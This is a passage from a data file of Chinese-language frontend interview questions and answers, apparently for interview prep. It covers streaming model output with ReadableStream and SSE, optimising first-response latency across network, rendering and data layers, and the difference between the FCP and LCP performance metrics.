| 多端统一 | Taro / uni-app / React Native |

### 前端趋势
1. **AI 辅助开发**：AI 生成代码、组件
2. **边缘计算**：Edge Functions（Vercel/Cloudflare Workers）
3. **Server Components**：React RSC
4. **WebAssembly**：高性能前端应用
5. **跨端统一**：Flutter / Taro / uni-app`,
  },
  {
    id: 'be-031',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'hard',
    tags: ['SSE', 'ReadableStream', '流式', '内存', '性能'],
    question: '前端通过 SSE / ReadableStream 接收大模型流式输出时，UI 渲染慢、内存容易暴涨，应该如何优化？',
    answer: `流式场景（如 AI 对话）的核心是「**边读边处理，不 accumulate 全量**」。

### 1. 用 ReadableStream 逐块消费，而不是等全部读完

\`\`\`javascript
const res = await fetch('/api/stream')
const reader = res.body.getReader()
const decoder = new TextDecoder()

while (true) {
  const { done, value } = await reader.read()
  if (done) break
  const chunk = decoder.decode(value, { stream: true })
  appendToUI(chunk)        // 逐块追加，不保存全量字符串
}
\`\`\`

### 2. 避免内存暴涨的关键点
- **不要拼接整个响应**：用 \`array.push(chunk)\` 后立刻渲染，或干脆不缓存，只在 UI 上累加（必要时只保留最终结果）。
- **批量更新 UI**：高频小块直接操作 DOM 会卡顿，用 \`requestAnimationFrame\` 或节流合并多次更新（每帧只重绘一次）。
- **SSE** 用原生 EventSource / 或 fetch + ReadableStream，监听 \`onmessage\` 逐条处理。
- **解码器复用**：\`TextDecoder\` 复用同一个实例，避免每片 new。

### 3. 多 Session / 切换标签页的状态隔离
- 用「草稿(draft) / 生成中(generating)」状态机管理，每个会话独立保存流式内容。
- 切走标签页时 rAF 暂停，回来再续；用 \`visibilitychange\` 控制是否继续追加渲染。

### 4. 内存泄漏排查
- 流式回调里引用的组件若已卸载，要取消 reader（\`reader.cancel()\`）并解绑监听。
- 长对话注意只保留必要上下文，旧消息可裁剪或摘要压缩。

> 一句话：**流式渲染 = 增量消费 + 合并更新 + 及时释放**，不要等「全部到齐」再处理。`
  },
  {
    id: 'be-032',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'hard',
    tags: ['性能优化', '首屏', 'TTFB', '全链路', '流式'],
    question: '一个页面首字符响应要 5 秒，如何把它优化到 200ms 以内？给出全链路优化思路。',
    answer: `把「5s -> 200ms」拆成三段瓶颈，逐段优化：

### 1. 网络层（TTFB 太大）
- **服务端**：接口加缓存（Redis）、数据库加索引、预计算/预渲染热点数据。
- **CDN**：静态资源与可缓存接口走 CDN，就近返回。
- **协议**：开启 HTTP/2、TLS 复用、开启 Brotli/Gzip 压缩。
- **边缘计算**：把首屏接口放到 Edge Function（Vercel/Cloudflare Workers），缩短物理距离。

### 2. 渲染层（HTML/CSS/JS 阻塞）
- **关键 CSS 内联**、非关键 CSS 异步加载，避免 \`@import\` 阻塞。
- **JS 瘦身**：代码分割（Route-level）、Tree Shaking、移除未用依赖。
- **延迟加载**：非首屏 JS 用 \`defer\`，图片用 \`loading="lazy"\` + 占位。
- **SSR / 流式渲染**：服务端先吐出首屏 HTML，TTFB 即可见文字（React 18 \`renderToPipeableStream\`、Vue \`renderToStream\`）。

### 3. 数据层（前端等接口）
- **流式输出**：大模型/长列表用 SSE 边生成边渲染，首字符很快出现。
- **预取**：路由 hover/visible 时预加载下一页资源（\`prefetch\`）。
- **并行请求**：用 \`Promise.all\` 并发，别串行 \`await\`。
- **骨架屏 / 占位**：先出结构，秒开体感。

### 监控闭环
- 用 LCP、FCP、TTFB 指标量化，定位是哪一段超标，再针对性优化——不要盲猜。

> 经验：**首字节慢先查后端/CDN，渲染慢查 CSS/JS 阻塞，白屏久查 SSR/流式**。`
  },
  {
    id: 'be-033',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['FCP', 'LCP', 'Web Vitals', '性能', '监控'],
    question: 'FCP 和 LCP 有什么区别和关系？各自如何优化？',
    answer: `### 定义

| 指标 | 含义 | 优秀阈值 |
|------|------|----------|
| **FCP**（First Contentful Paint） | 浏览器**首次**渲染出任何文本/图片/非空白内容 | < 1.8s |
| **LCP**（Largest Contentful Paint） | 视口内**最大**的内容元素（大图/大块文本）渲染完成 | < 2.5s |

### 关系
- **逻辑上 FCP 一定早于或等于 LCP**：最大内容绘制必然建立在「已经有内容绘出」之后。
- FCP 衡量「有没有开始画」，LCP 衡量「主要内容画完没」——后者更贴近用户真实体感。

### 优化 FCP
- 减少阻塞渲染的资源（关键 CSS 内联、JS 用 \`defer\`）。
- 开启压缩、HTTP/2、CDN。
- 预连接关键域名：\`<link rel="preconnect">\`。

### 优化 LCP
- **LCP 元素往往是首屏大图或大标题**：图片用现代格式（WebP/AVIF）、设 \`width/height\` 防抖动、用 \`fetchpriority="high"\` 优先加载。
- 服务端预渲染首屏 HTML（SSR），让用户尽快看到主要内容。
- 避免 LCP 元素被懒加载/动画延迟出现。

### 测量
\`\`\`javascript
import { onFCP, onLCP } from 'web-vitals'
onFCP(console.log)
onLCP(console.log)
\`\`\`

> 面试常考陷阱：FCP 出现不等于 LCP 出现；**LCP 一定 >= FCP**，但二者可能非常接近（当首屏最大元素就是第一个绘制内容时）。`
  },
]
